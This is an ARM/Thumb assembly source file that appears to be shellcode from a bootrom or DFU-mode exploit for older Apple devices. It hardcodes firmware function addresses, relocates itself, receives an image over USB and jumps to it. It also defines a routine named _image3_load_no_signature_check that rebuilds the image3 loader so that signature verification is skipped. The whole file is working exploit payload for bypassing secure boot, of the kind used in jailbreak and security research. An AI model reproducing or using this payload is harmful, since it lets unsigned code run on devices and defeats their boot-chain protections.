.text

.pool
.set free,                          0x3b95
.set memz_create,                   0x7469
.set memz_destroy,                  0x7451
.set image3_create_struct,          0x412d
.set image3_load_continue,          0x46db
.set image3_load_fail,              0x47db
.set usb_wait_for_image,            0x4c85
.set jump_to,                       0x5a5d
.set nor_power_on,                  0x4e8d
.set nor_init,                      0x690d
.set memmove,                       0x84dc
.set strlcat,                       0x90c9

.set gLeakingDFUBuffer,             0x8402dbcc
.set gUSBSerialNumber,              0x8402e0e0

.set relocated_payload_addr,    0x84039800
.set relocated_payload_size,       1024
.set    stack_address, 0x8403c000
.set LOAD_ADDRESS,                  0x84000000
.set MAX_SIZE,                      0x2c000
.set EXEC_MAGIC,                    0x65786563
.set IMAGE3_LOAD_SP_OFFSET,         0x68
.set IMAGE3_LOAD_STRUCT_OFFSET,     0x64

.extern _c_entry_point

_start:
.code 16
    b   relocate_shellcode
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop

relocate_shellcode:
    @ Are we already running from the relocated shellcode?
    mov r1, pc
    sub r1, r1, #4
    ldr r0, =relocated_payload_addr
    cmp r0, r1
    beq continue_relocated

    @ Relocate the payload now
    ldr r2, =relocated_payload_size
    ldr r3, =memmove
    @ memmove(relocated_payload_addr, pc_base, relocated_payload_size)
    blx r3

    ldr r3, =relocated_payload_addr
    @ THUMB
    add r3, r3, #1
    @ Jump to relocated shellcode
    bx r3

continue_relocated:
    @ Set up a stack
    ldr r0, =stack_address
    mov sp, r0
    @ Jump to ARM for compatibility with the Rust payload, which always targets ARM
    blx _continue_loop

.code 32
.align 4
.global _continue_loop
.global _image3_load_no_signature_check
_continue_loop:
    @ Our Rust always targets ARM, so switch modes
    blx _receive_and_jump_to_image

    LDR R1, =LOAD_ADDRESS
    MOV R2, #0
    LDR R3, =jump_to
    BLX R3                                      @ jump_to(0, LOAD_ADDRESS, 0)

    /* jump_to should never return */

.global _image3_load_no_signature_check
_image3_load_no_signature_check:
    PUSH {R4-R7, LR}                            @ push_registers(R4, R5, R6, R7, LR)

    MOV R6, R11
    MOV R5, R10
    MOV R4, R8
    PUSH {R4-R6}                                @ push_registers(R8, R10, R11)

    ADD R7, SP, #0x18                           @ R7 = SP - 0x18

    LDR R4, =IMAGE3_LOAD_SP_OFFSET
    MOV R5, SP
    SUB R5, R5, R4
    MOV SP, R5                                  @ SP = SP - IMAGE3_LOAD_SP_OFFSET

    MOV R3, #0
    LDR R4, =IMAGE3_LOAD_STRUCT_OFFSET
    ADD R4, R5, R4
    STR R3, [R4]                                @ *(SP + IMAGE3_LOAD_STRUCT_OFFSET) = 0

    STR R2, [SP, #0x10]                         @ SP[4] = R2

    STR R1, [SP, #0x14]                         @ SP[5] = R1

    STR R3, [SP, #0x18]                         @ SP[6] = 0

    LDR R6, [R1]                                @ R6 = *R1

    MOV R10, R1                                 @ R10 = R1

    MOV R11, R3                                 @ R11 = 0

    LDR R1, =MAX_SIZE
    MOV R8, R1                                  @ R8 = MAX_SIZE

    LDR R2, [R0, #4]
    MOV R8, R2                                  @ R8 = R0[1]

    MOV R0, R4
    MOV R1, R6
    LDR R4, =image3_create_struct
    BLX R4
    MOV R4, R0                                  @ R4 = image3_create_struct(SP + IMAGE3_LOAD_STRUCT_OFFSET, R6, R8, 0)

    @ image3_load_continue()
    ldr r3, =image3_load_continue
    bx r3
